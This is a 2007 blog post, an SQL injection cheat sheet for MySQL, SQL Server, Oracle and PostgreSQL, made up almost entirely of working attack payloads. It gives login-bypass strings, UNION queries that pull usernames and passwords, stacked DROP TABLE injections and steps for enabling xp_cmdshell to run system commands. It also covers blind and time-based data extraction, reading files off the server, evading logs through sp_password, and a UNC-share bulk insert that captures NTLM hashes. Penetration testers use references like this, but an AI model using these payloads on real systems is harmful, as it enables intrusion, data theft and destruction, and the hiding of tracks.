::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: {#container}
::: {#header}
[![Ferruh Mavituna Logo](/mg/fm.gif){width="146" height="65"}](/)
:::

::::::::::::::::::::::::::::::::::::::::::::::::::::::: {#wrapper}
::: navtoggle
[![](/mg/icons/hide.gif){.abs width="17" height="16"} Menüyü
Gizle](javascript:;){.jnavigation style="text-decoration:none"}
:::

::::::::::::::::::::::::::::::::::::::::::::::::::::: {#content}
::: {.ad style="float:none;width:100%;text-align:center;margin-bottom:10px"}
[![](/mg/ad/web_egitimi.gif)](http://www.guvenlikegitimleri.com/new/web-application-pentest-egitimi-22-mayis-2010)
:::

::::::: {#blogsql-injection-cheatsheet .blog}
# [SQL Injection Cheat Sheet](/sql-injection-cheatsheet-oku/)

::: tags
![Etiketler](/mg/icons/tag_blue.png){.abs width="16" height="16"} [sql
injection](/tag/sql+injection/){.tag}, [security](/tag/security/){.tag},
[web application security](/tag/web+application+security/){.tag}, [web
uygulamasi guvenligi](/tag/web+uygulamasi+guvenligi/){.tag},
[english](/tag/english/){.tag}, [15.03.2007]{.date}
:::

::: post
 

## *Find and exploit SQL Injections with [Netsparker, Next Generation Web Application Security Scanner](http://www.mavitunasecurity.com/)*

 

*SQL Injection Cheat Sheet, **Document Version 1.4***

## []{#about}About SQL Injection Cheat Sheet

Currently only for **MySQL** and **Microsoft SQL Server,** some
**ORACLE** and some **PostgreSQL**. Most of samples are not correct for
every single situation. Most of the real world environments may change
because of parenthesis, different code bases and unexpected, strange SQL
sentences.\
\
Samples are provided to allow reader to get basic idea of a potential
attack and almost every section includes a brief information about
itself.

  --------- ------------------------------
    **M :** MySQL
    **S :** SQL Server
    **P :** PostgreSQL
    **O :** Oracle
    **+ :** Possibly all other databases
  --------- ------------------------------

##### ***Examples;***

-   *(MS) means : MySQL and SQL Server etc.*
-   (M\*S) means : Only in some versions of MySQL or special conditions
    see related note and SQL Server

## []{#TOC}Table Of Contents

1.  [About SQL Injection Cheat Sheet](#about)
2.  [Syntax Reference, Sample Attacks and Dirty SQL Injection
    Tricks](#SyntaxBasicAttacks)
    1.  [Line Comments](#LineComments)
        -   [SQL Injection Attack Samples](#LineCommentAttacks)
    2.  [Inline Comments](#InlineComments)
        -   [Classical Inline Comment SQL Injection Attack
            Samples](#InlineSamples)
        -   [MySQL Version Detection Sample
            Attacks](#MySQLInlineSamples)
    3.  [Stacking Queries](#StackingQueries)
        -   [Language / Database Stacked Query Support
            Table](#LangDbFigure)
        -   [About MySQL and PHP](#AboutMySQLandPHP)
        -   [Stacked SQL Injection Attack Samples](#StackedSamples)
    4.  [If Statements](#IfStatements)
        -   [MySQL If Statement](#MySQLIf)
        -   [SQL Server If Statement](#SQLServerIf)
        -   [If Statement SQL Injection Attack
            Samples](#SampleIfStatements)
    5.  [Using Integers](#UsingIntegers)
    6.  [String  Operations](#StringOperations)
        -   [String Concatenation](#StringConcat)
    7.  [Strings without Quotes](#StringwithoutQuotes)
        -   [Hex based SQL Injection Samples](#HexbasedSamples)
    8.  [String Modification & Related](#StringModification)
    9.  [Union Injections](#UnionInjections)
        -   [UNION -- Fixing Language Issues](#UnionLanguageIssues)
    10. [Bypassing Login Screens](#ByPassingLoginScreens)
    11. [Enabling xp_cmdshell in SQL Server 2005](#Enablecmdshell)
    12. *Other parts are not so well formatted but check out by
        yourself, drafts, notes and stuff, scroll down and see.*

## []{#SyntaxBasicAttacks}Syntax Reference, Sample Attacks and Dirty SQL Injection Tricks

### []{#21}Ending / Commenting Out / Line Comments {#ending-commenting-out-line-comments .style2}

#### []{#LineComments}Line Comments

**Comments out rest of the query.**\
Line comments are generally useful for ignoring rest of the query so you
don't have to deal with fixing the syntax.

-   `-- `(SM)\
    `DROP sampletable;`[`--`]{.hi}\
    \
-   `# `(M)\
    `DROP sampletable;`[`#`]{.hi}

##### []{#LineCommentAttacks}Line Comments Sample SQL Injection Attacks

-   [Username:]{.inputfield}` admin`[`'--`]{.hi}` `
-   `SELECT * FROM members WHERE username = '`[`admin'--`]{.hi}[`' AND password = 'password'`]{.comment}\
    [This is going to log you as admin user, because rest of the SQL
    query will be ignored.]{.idea}

#### []{#InlineComments}Inline Comments

**Comments out rest of the query by not closing them** or you can use
for **bypassing blacklisting**, removing spaces, obfuscating and
determining database versions.

-   `/*Comment Here*/` (SM)
    -   `DROP`[`/*comment*/`]{.hi}`sampletable`
    -   `DR`[`/**/`]{.hi}`OP`[`/*bypass blacklisting*/`]{.hi}`sampletable`
    -   `SELECT`[`/*avoid-spaces*/`]{.hi}`password`[`/**/`]{.hi}`FROM`[`/**/`]{.hi}`Members`\
        \
-   `/*! MYSQL Special SQL *`/ (M)\
    [This is a special comment syntax for MySQL. It's perfect for
    detecting MySQL version. If you put a code into this comments it's
    going to execute in MySQL only. Also you can use this to execute
    some code only if the server is higher than supplied
    version.]{.idea}\
    \
    `SELECT `[`/*!`**`32302`**` 1/0, */`]{.hi}` 1 FROM tablename`

##### []{#InlineSamples}Classical Inline Comment SQL Injection Attack Samples

-   [ID:]{.inputfield} `10; DROP TABLE members `[`/*`]{.hi}\
    [Simply get rid of other stuff at the end the of query. Same as
    `10; DROP TABLE members `[`--`]{.hi}]{.idea}\
    \
-   `SELECT `[`/*!`**`32302`**` 1/0, */`]{.hi}` 1 FROM tablename`\
    [Will throw an **divison by 0 error** if MySQL version is higher
    than **3.23.02**]{.idea}

##### []{#MySQLInlineSamples}MySQL Version Detection Sample Attacks

-   [ID:]{.inputfield} [`/*!`]{.hi}**`32302`**` 10`[`*/`]{.hi}` `
-   [ID:]{.inputfield} `10`\
    [You will get the **same response** if MySQL version is higher than
    **3.23.02**]{.idea}\
    \
-   `SELECT `[`/*!`**`32302`**` 1/0, */`]{.hi}` 1 FROM tablename`\
    [Will throw an **divison by 0 error** if MySQL version is higher
    than **3.23.02**]{.idea}

### []{#StackingQueries}Stacking Queries

**Executing more than one query in one transaction**. This is very
useful in every injection point, especially in SQL Server back ended
applications.

-   `;` (S)\
    `SELECT * FROM members`[`; DROP members--`]{.hi}

Ends a query and starts a new one.

#### []{#LangDbFigure}Language / Database Stacked Query Support Table

**green:** supported, **dark gray:** not supported, **light gray:**
unknown

  ------------- ---------------- ----------- ---------------- ------------ ---------------
                **SQL Server**   **MySQL**   **PostgreSQL**   **ORACLE**   **MS Access**
  **ASP**                                                                   
  **ASP.NET**                                                               
  **PHP**                                                                   
  **Java**                                                                  
  ------------- ---------------- ----------- ---------------- ------------ ---------------

 

**[]{#AboutMySQLandPHP}About MySQL and PHP;**\
To clarify some issues;\
**PHP - MySQL doesn\'t support stacked queries**, Java doesn\'t support
stacked queries (*I\'m sure for ORACLE, not quite sure about other
databases*). *Normally MySQL supports stacked queries but because of
database layer in most of the configurations it's not possible to
execute second query in PHP-MySQL applications or maybe MySQL client
supports this, not quite sure. Can someone clarify?*

##### []{#StackedSamples}Stacked SQL Injection Attack Samples

-   [ID:]{.inputfield} `10;DROP members --`
-   `SELECT * FROM products WHERE id = 10`[`; DROP members--`]{.hi}

This will run *DROP members* SQL sentence after normal SQL Query.\

### []{#IfStatements}If Statements

Get response based on a if statement. This is **one of the key points of
Blind SQL Injection**, also can be very useful to test simple stuff
blindly and **accurately**.

#### []{#MySQLIf}MySQL If Statement

-   `IF(`***`condition`*`,`*`true-part`*`,`*`false-part`***`) `(M)\
    `SELECT IF(1=1,'true','false')`

#### []{#SQLServerIf}SQL Server If Statement

-   `IF `***`condition`***` `***`true-part`***` ELSE `***`false-part`***
    (S)\
    `IF (1=1) SELECT 'true' ELSE SELECT 'false'`

##### []{#SampleIfStatements}If Statement SQL Injection Attack Samples

`if ((select user) = 'sa' OR (select user) = 'dbo') select 1 else select 1/0`
(S)\
[This will throw an **divide by zero error** if current logged user is
not **\"sa\" or \"dbo\"**.]{.idea}

### []{#UsingIntegers}Using Integers

Very useful for bypassing, **magic_quotes() and similar filters**, or
even WAFs.

-   `0x`*`HEXNUMBER`* (SM)\
    [You can  write hex like these;]{.idea}\
    \
    `SELECT CHAR(0x66)` (S)\
    `SELECT 0x5045` [(*this is not an integer it will be a string from
    Hex*)]{.idea} (M)\
    `SELECT 0x50 + 0x45` [(*this is integer now!*)]{.idea} (M)

### []{#StringOperations}String  Operations

String related operations. These can be quite useful to build up
injections which are not using any quotes, bypass any other black
listing or determine back end database.

#### []{#StringConcat}String Concatenation

-   `+` (S)\
    `SELECT login `[`+ '-' +`]{.hi}` password FROM members`\
    \
-   `||` (\*MO)\
    `SELECT login `[`|| '-' ||`]{.hi}` password FROM members `

**\*About MySQL \"\|\|\";**\
If MySQL is running in ANSI mode it's going to work but otherwise MySQL
accept it as \`logical operator\` it'll return 0. Better way to do it is
using `CONCAT()` function in MySQL.

-   `CONCAT(str1, str2, str3, ...)` (M)\
    [Concatenate supplied strings.]{.idea}\
    `SELECT `[`CONCAT(login, password)`]{.hi}` FROM members`

### []{#StringwithoutQuotes}Strings without Quotes

These are some direct ways to using strings but it's always possible to
use `CHAR()`(MS) and `CONCAT()`(M) to generate string without quotes.

-   `0x457578` (M) - [Hex Representation of string ]{.idea}\
    `SELECT 0x457578`\
    [This will be selected as string in MySQL.]{.idea}\
    \
    [In MySQL easy way to generate hex representations of strings use
    this;]{.idea}\
    `SELECT CONCAT('0x',HEX('c:\\boot.ini'))`\
    \
-   [Using `CONCAT()` in MySQL]{.idea}\
    `SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))` (M)\
    [This will return 'KLM'.]{.idea}\
    \
-   `SELECT CHAR(75)+CHAR(76)+CHAR(77)` (S)\
    [This will return 'KLM'. ]{.idea}

#### []{#HexbasedSamples}Hex based SQL Injection Samples

-   `SELECT LOAD_FILE(`[`0x633A5C626F6F742E696E69`]{.hi}`)` (M)\
    [This will show the content of **c:\\boot.ini**]{.idea}

### []{#StringModification}String Modification & Related

-   `ASCII()` (SMP)\
    [Returns ASCII character value of leftmost character. A must have
    function for Blind SQL Injections.]{.idea}\
    \
    `SELECT ASCII('a')`\
    \
-   `CHAR()` (SM)\
    [Convert an integer of ASCII.]{.idea}\
    \
    `SELECT CHAR(64)`

## []{#UnionInjections}Union Injections

With union you do SQL queries cross-table. Basically you can poison
query to return records from another table.

`SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members `\
[This will combine results from both news table and members table and
return all of them. ]{.idea}

[Another Example : ]{.idea}\
`' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--`

### []{#UnionLanguageIssues}UNION -- Fixing Language Issues

While exploiting Union injections sometimes you get errors because of
different language settings (*table settings, field settings, combined
table / db settings etc.*) these functions are quite useful to fix this
problem. It\'s rare but if you dealing with *Japanese, Russian, Turkish*
etc. applications then you will see it.

-   SQL Server (S)\
    Use [`field` **`COLLATE`**` SQL_Latin1_General_Cp1254_CS_AS`]{.hi}
    or some other valid one - *check out SQL Server documentation*.\
    \
    `SELECT header FROM news UNION ALL SELECT name COLLATE SQL_Latin1_General_Cp1254_CS_AS FROM members`\
    \
-   MySQL (M)\
    `Hex() `[for every possible issue]{.idea}

### []{#ByPassingLoginScreens}Bypassing Login Screens (SMO+)

[*SQL Injection 101*, Login tricks ]{.idea}

-   `admin' -- `
-   `admin' # `
-   `admin'/*`
-   `' or 1=1--`
-   `' or 1=1#`
-   `' or 1=1/*`
-   `') or '1'='1--`
-   `') or ('1'='1--`
-   \....

<!-- -->

-   Login as different user (SM\*)\
    `' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--`

*\*Old versions of MySQL doesn\'t support union queries*

### []{#UnionLanguageIssues}Bypassing second MD5 hash check login screens

If application is first getting the record by username and then compare
returned MD5 with supplied password\'s MD5 then you need to some extra
tricks to fool application to bypass authentication. You can union
results with a known password and MD5 hash of supplied password. In this
case application will compare your password and your supplied MD5 hash
instead of MD5 from database.

#### []{#BypassingMD5Hash}Bypassing MD5 Hash Check Example (MSP)

[Username :]{.inputfield}` admin`\
[Password :]{.inputfield}
`1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055`

`81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234) `

###  

### Error Based - Find Columns Names

#### Finding Column Names with **HAVING BY** - Error Based (S)

*In the same order,*

-   \'` HAVING 1=1 -- `
-   `' GROUP BY `**`table.columnfromerror1`**` HAVING 1=1 -- `
-   `' GROUP BY `**`table.columnfromerror1, columnfromerror2`**` HAVING 1=1 --`
-   `' GROUP BY `**`table.columnfromerror1, columnfromerror2, columnfromerror(n)`**` HAVING 1=1 --`
    *and so on*
-   If you are not getting any more error then it\'s done.

#### Finding how many columns in SELECT query by **ORDER BY** **(MSO+)**

Finding column number by ORDER BY can speed up the UNION SQL Injection
process.

-   `ORDER BY 1-- `
-   `ORDER BY 2--`
-   `ORDER BY N--` *so on*
-   Keep going until get an error. Error means you found the number of
    selected columns.

### Data types, UNION, etc.

#### Hints,

-   Always use **UNION** with **ALL** because of **image** similiar
    non-distinct field types. By default union tries to get records with
    distinct.
-   To get rid of unrequired records from left table use -1 or any not
    exist record search in the beginning of query (*if injection is in
    WHERE*). This can be critical if you are only getting one result at
    a time.
-   Use NULL in UNION injections for most data type instead of trying to
    guess string, date, integer etc.
    -   Be careful in Blind situtaions may you can understand error is
        coming from DB or application itself. Because languages like
        ASP.NET generally throws errors while trying to use NULL values
        (*because normally developers are not expecting to see NULL in a
        username field*)

#### Finding Column Type

-   `' union select `[`sum(`**`columntofind`**`)`]{.hi}` from `**`users`**`--`
    (S)\
    `Microsoft OLE DB Provider for ODBC Drivers error '80040e07'`\
    `[Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a `**`varchar`**` data type as an argument.`\
    \
    *If you are not getting error it means* column is numeric.\
    \
-   Also you can use [CAST()]{.hi} or [CONVERT()]{.hi}
    -   `SELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL--`\
        \
-   `11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 –-`\
    No Error - Syntax is right. MS SQL Server Used. Proceeding.\
    \
-   `11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2 –-`\
    No Error -- First column is an integer.\
    \
-   `11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2 -- `\
    Error! -- Second column is not an integer.\
    \
-   `11223344) UNION SELECT 1,’2’,NULL,NULL WHERE 1=2 –-`\
    No Error -- Second column is a string.\
    \
-   `11223344) UNION SELECT 1,’2’,3,NULL WHERE 1=2 –-`\
    Error! -- Third column is not an integer. \...\
    \
    `Microsoft OLE DB Provider for SQL Server error '80040e07'`\
    `Explicit conversion from data type `[**`int`**` to image`]{.hi}` is not allowed.`

**You'll get convert() errors before union target errors !** So start
with convert() then union

### Simple Insert (MSO+)

`'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/*`

### Useful Function / Information Gathering / Stored Procedures / Bulk SQL Injection Notes

**@@version** (MS)\
Version of database and more details for SQL Server. It\'s a constant.
You can just select it like any other column, you don\'t need to supply
table name. Also you can use insert, update statements or in functions.

`INSERT INTO members(id, user, pass) VALUES(1, ''+`[`SUBSTRING(@@version,1,10)`]{.hi}` ,10)`

#### []{#BulkInsert}Bulk Insert (S)

Insert a file content to a table. If you don\'t know internal path of
web application you can **read IIS (***IIS 6 only***) metabase file**
(*%systemroot%\\system32\\inetsrv\\MetaBase.xml*) and then search in it
to identify application path.

1.  1.  Create table foo( line varchar(8000) )
    2.  bulk insert foo from \'c:\\inetpub\\wwwroot\\login.asp\'
    3.  *Drop temp table, and repeat for another file.*

#### BCP (S)

Write text file. Login Credentials are required to use this function.\
`bcp "SELECT * FROM test..foo" queryout c:\inetpub\wwwroot\runcommand.asp -c -Slocalhost -Usa -Pfoobar `

#### VBS, WSH in SQL Server (S)

You can use VBS, WSH scripting in SQL Server because of ActiveX support.

`declare @o int`\
`exec sp_oacreate 'wscript.shell', @o out`\
`exec sp_oamethod @o, 'run', NULL, 'notepad.exe'`\
*`Username:`*` '; declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL, 'notepad.exe' --`\

#### Executing system commands, xp_cmdshell (S)

Well known trick, By default it\'s disabled in *SQL Server 2005.* You
need to have admin access.

`EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'`\

Simple ping check (*configure your firewall or sniffer to identify
request before launch it*),

`EXEC master.dbo.xp_cmdshell 'ping '`

You can not read results directly from error or union or something else.

#### Some Special Tables in SQL Server (S)

-   Error Messages\
    `master..sysmessages `\
    \
-   Linked Servers\
    `master..sysservers`\
    \
-   Password (*2000 and 20005 both can be crackable, they use very
    similar hashing algorithm* )\
    SQL Server 2000:` masters..sysxlogins`\
    SQL Server 2005 : `sys.sql_logins`\

#### More Stored Procedures for SQL Server (S)

1.  Cmd Execute (**xp_cmdshell**)\
    exec master..xp_cmdshell \'dir\'\
    \
2.  Registry Stuff (**xp_regread**)\
    1.  xp_regaddmultistring
    2.  xp_regdeletekey
    3.  xp_regdeletevalue
    4.  xp_regenumkeys
    5.  xp_regenumvalues
    6.  xp_regread
    7.  xp_regremovemultistring
    8.  xp_regwrite\
        exec xp_regread HKEY_LOCAL_MACHINE,
        \'SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters\',
        \'nullsessionshares\'\
        exec xp_regenumvalues HKEY_LOCAL_MACHINE,
        \'SYSTEM\\CurrentControlSet\\Services\\snmp\\parameters\\validcommunities\'\
        \
3.  Managing Services (**xp_servicecontrol**)\
4.  Medias (**xp_availablemedia**)\
5.  ODBC Resources (**xp_enumdsn**)\
6.  Login mode (**xp_loginconfig**)\
7.  Creating Cab Files (**xp_makecab**)\
8.  Domain Enumeration (**xp_ntsec_enumdomains**)\
9.  Process Killing (*need PID*) (**xp_terminate_process**)\
10. Add new procedure (*virtually you can execute whatever you want*)\
    sp_addextendedproc 'xp_webserver', 'c:\\temp\\x.dll'\
    exec xp_webserver
11. Write text file to a UNC or an internal path (sp_makewebtask)\

#### MSSQL Bulk Notes

`SELECT * FROM master..sysprocesses /*WHERE spid=@@SPID*/ `

`DECLARE @result int; EXEC @result = xp_cmdshell 'dir *.exe';IF (@result = 0) SELECT 0 ELSE SELECT 1/0`

HOST_NAME()\
IS_MEMBER (Transact-SQL) \
IS_SRVROLEMEMBER (Transact-SQL) \
OPENDATASOURCE (Transact-SQL)

    INSERT tbl EXEC master..xp_cmdshell OSQL /Q"DBCC SHOWCONTIG"

OPENROWSET (Transact-SQL)  -
<http://msdn2.microsoft.com/en-us/library/ms190312.aspx>

You can not use sub selects in SQL Server Insert queries.

#### SQL Injection in LIMIT (M) or ORDER (MSO)

`SELECT id, product FROM test.test t LIMIT 0,0 UNION ALL SELECT 1,'x'/*,10 ;`

If injection is in second *limit* you can comment it out or use in your
union injection

#### Shutdown SQL Server (S)

When you really pissed off, `';shutdown -- `

### []{#Enablecmdshell}Enabling xp_cmdshell in SQL Server 2005

By default xp_cmdshell and couple of other potentially dangerous stored
procedures are disabled in SQL Server 2005. If you have admin access
then you can enable these.

`EXEC sp_configure 'show advanced options',1`\
`RECONFIGURE`

`EXEC sp_configure 'xp_cmdshell',1`\
`RECONFIGURE`

### Finding Database Structure in SQL Server (S)

#### Getting User defined Tables

`SELECT name FROM sysobjects WHERE xtype = 'U'`

#### Getting Column Names

`SELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'tablenameforcolumnnames')`

### Moving records (S)

-   Modify WHERE and use **`NOT IN`** or **`NOT EXIST`**,\
    `... WHERE users NOT IN ('First User', 'Second User')`\
    `SELECT TOP 1 name FROM members WHERE NOT EXIST(SELECT TOP 0 name FROM members)`{.hi}
    *\-- very good one*\
    \
-   Using Dirty Tricks\
    `SELECT * FROM Product WHERE ID=2 AND 1=CAST((Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE i.id<=o.id) AS x, name from sysobjects o) as p where p.x=3) as int `\
    \
    `Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE xtype='U' and i.id<=o.id) AS x, name from sysobjects o WHERE o.xtype = 'U') as p where p.x=21`\

 

### Fast way to extract data from Error Based SQL Injections in SQL Server (S)

[`';BEGIN DECLARE @rt varchar(8000) SET @rd=':' SELECT @rd=@rd+' '+name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'MEMBERS') AND name>@rd SELECT @rd AS rd into TMP_SYS_TMP end;--`]{#gr}

**Detailed Article :** [[Fast way to extract data from Error Based SQL
Injections](http://ferruh.mavituna.com/makale/fast-way-to-extract-data-from-error-based-sql-injections/)]{#gr}\

## Blind SQL Injections

### About Blind SQL Injections

In a quite good production application generally **you can not see error
responses on the page**, so you can not extract data through Union
attacks or error based attacks. You have to do use Blind SQL Injections
attacks to extract data. There are two kind of Blind Sql Injections.

**Normal Blind**, You can not see a response in the page but you can
still determine result of a query from response or HTTP status code\
**Totally Blind**, You can not see any difference in the output in any
kind. This can be an injection a logging function or similar. Not so
common though.

In normal blinds you can use **if statements** or abuse **WHERE query in
injection** (*generally easier*), in totally blinds you need to use some
waiting functions and analyze response times. For this you can use
**WAIT FOR DELAY \'0:0:10\'** in SQL Server, BENCHMARK() in MySQL,
**pg_sleep(10)** in PostgreSQL, and some PL/SQL tricks in ORACLE.

#### []{#BSQLAttackSamples}Real and a bit Complex Blind SQL Injection Attack Sample

This output taken from a real private Blind SQL Injection tool while
exploiting SQL Server back ended application and enumerating table
names. This requests done for first char of the first table name. SQL
queries a bit more complex then requirement because of automation
reasons. In we are trying to determine an ascii value of a char via
binary search algorithm.

***TRUE** and **FALSE** flags mark queries returned true or false.*

**`TRUE`**` : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>78--`\
\
**`FALSE`**` : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>103--`\
\
**`TRUE`**` : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)<103--`\
\
**`FALSE`**` : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>89--`\
\
**`TRUE`**` : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)<89--`\
\
**`FALSE`**` : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>83--`\
\
**`TRUE`**` : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)<83--`\
\
**`FALSE`**` : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>80--`\
\
**`FALSE`**` : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)<80-- `

Since both of the **last 2 queries failed** we clearly know table
name\'s first char\'s **ascii value is 80 which means first char is
\`P\`**. This is the way to exploit Blind SQL injections by binary
search algorithm. Other well known way is reading data bit by bit. Both
can be effective in different conditions.

###  

### Waiting For Blind SQL Injections

First of all use this if it\'s really blind, otherwise just use 1/0
style errors to identify difference. Second, be careful while using
times more than 20-30 seconds. database API connection or script can be
timeout.

#### WAIT FOR DELAY \'time\' (S)

This is just like sleep, wait for spesified time. CPU safe way to make
database wait.

`WAITFOR DELAY '0:0:10'--`

Also you can use fractions like this,

`WAITFOR DELAY '0:0:0.51'`

#### Real World Samples

-   Are we \'sa\' ?\
    `if (select user) = 'sa' waitfor delay '0:0:10' `
-   ProductID = `1;waitfor delay '0:0:10'--`
-   ProductID =`1);waitfor delay '0:0:10'--`
-   ProductID =`1';waitfor delay '0:0:10'--`
-   ProductID =`1');waitfor delay '0:0:10'--`
-   ProductID =`1));waitfor delay '0:0:10'--`
-   ProductID =`1'));waitfor delay '0:0:10'--`

#### BENCHMARK() (M)

Basically we are abusing this command to make MySQL wait a bit. Be
careful you will consume web servers limit so fast!

`BENCHMARK(howmanytimes, do this)`

#### Real World Samples

-   Are we root ? woot!\
    `IF EXISTS (SELECT * FROM users WHERE username = 'root') BENCHMARK(1000000000,MD5(1))`\
    \
-   Check Table exist in MySQL\
    `IF (SELECT * FROM login) BENCHMARK(1000000,MD5(1))`\

#### pg_sleep(seconds) (P)

Sleep for supplied seconds.

-   `SELECT pg_sleep(10); `\
    [Sleep 10 seconds. ]{.idea}

## Covering Tracks

#### SQL Server -sp_password log bypass (S)

SQL Server don\'t log queries which includes sp_password for security
reasons(!). So if you add \--sp_password to your queries it will not be
in SQL Server logs (*of course still will be in web server logs*, *try
to use POST if it\'s possible*)

## Clear SQL Injection Tests

These tests are simply good for blind sql injection and silent attacks.

1.  `product.asp?id=4 (SMO) `
    a.  `product.asp?id=5-1`
    b.  `product.asp?id=4 OR 1=1`\
        \
2.  `product.asp?name=Book`
    a.  `product.asp?name=Bo’%2b’ok`
    b.  `product.asp?name=Bo’ || ’ok (`*`OM`*`)`
    c.  `product.asp?name=Book’ OR ‘x’=’x`

## Some Extra MySQL Notes

-   Sub Queries are working only MySQL 4.1+
-   Users
    -   `SELECT User,Password FROM mysql.user;`
-   `SELECT 1,1 UNION SELECT IF(SUBSTRING(Password,1,1)='2',BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = ‘root’;`
-   [`SEL`]{.hi}`ECT ... INTO DUMPFILE`
    -   `Write quer`[`y into a `**`new file`**` (`*`can not modify existing file`*`s)`]{.hi}
-   UDF Function
    -   `create function LockWorkStation returns integer soname 'user32';`
    -   `select LockWorkStation();`\
    -   `create function ExitProcess returns integer soname 'kernel32';`
    -   `select exitprocess();`
-   `SELECT USER();`
-   `SELECT password,USER() FROM mysql.user;`
-   First byte of admin hash
    -   `SELECT SUBSTRING(user_password,1,1) FROM mb_users WHERE user_group = 1;`
-   Read File
    -   `query.php?user=1+union+select+load_file(0x63...),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1`
-   MySQL Load Data inifile\
    -   **By default it's not avaliable !**
        -   `create table foo( line blob );`\
            `load data infile 'c:/boot.ini' into table foo;`\
            `select * from foo;`
-   More Timing in MySQL
-   `select benchmark( 500000, sha1( 'test' ) );`
-   `query.php?user=1+union+select+benchmark(500000,sha1 (0x414141)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 `
-   `select if( user() like 'root@%', benchmark(100000,sha1('test')), 'false' );`\
    **Enumeration data, Guessed Brute Force**
    -   `select if( (ascii(substring(user(),1,1)) >> 7) & 1, benchmark(100000,sha1('test')), 'false' );`

#### Potentially Useful MySQL Functions

-   `MD5()`\
    [MD5 Hashing ]{.idea}\
-   `SHA1()`\
    [SHA1 Hashing ]{.idea}\
    \
-   `PASSWORD()`
-   `ENCODE()`
-   `COMPRESS()`\
    [Compress data, can be great in large binary reading in Blind SQL
    Injections.]{.idea}\
-   `ROW_COUNT()`
-   `SCHEMA()`
-   `VERSION()`\
    [Same as `@@version`]{.idea}

## Second Order SQL Injections

Basically you put an SQL Injection to some place and expect it\'s
unfiltered in another action. This is common hidden layer problem.

Name : `' + (SELECT TOP 1 password FROM users ) + ' `\
Email :` `[`xx@xx.com`](mailto:xx@xx.com)

If application is using name field in an unsafe stored procedure or
function, process etc. then it will insert first users password as your
name etc.

### Forcing SQL Server to get NTLM Hashes

This attack can help you to get SQL Server user\'s Windows password of
target server, but possibly you inbound connection will be firewalled.
Can be very useful internal penetration tests. We force SQL Server to
connect our Windows UNC Share and capture data NTLM session with a tool
like Cain & Abel.

#### Bulk insert from a UNC Share (S) `bulk insert foo from '\\YOURIPADDRESS\C$\x.txt' `

Check out Bulk Insert Reference to understand how can you use bulk
insert.

## References

*Since these notes collected from several different sources within
several years and personal experiences, may I missed some references. If
you believe I missed yours or someone else then [drop me an
email](http://ferruh.mavituna.com/iletisim/) (ferruh-at-mavituna.com),
I\'ll update it as soon as possible.*

-   **Lots of Stuff**
    -   [Advanced SQL Injection In SQL
        Applications](http://www.ngssoftware.com/papers/advanced_sql_injection.pdf),
        *Chris Anley*
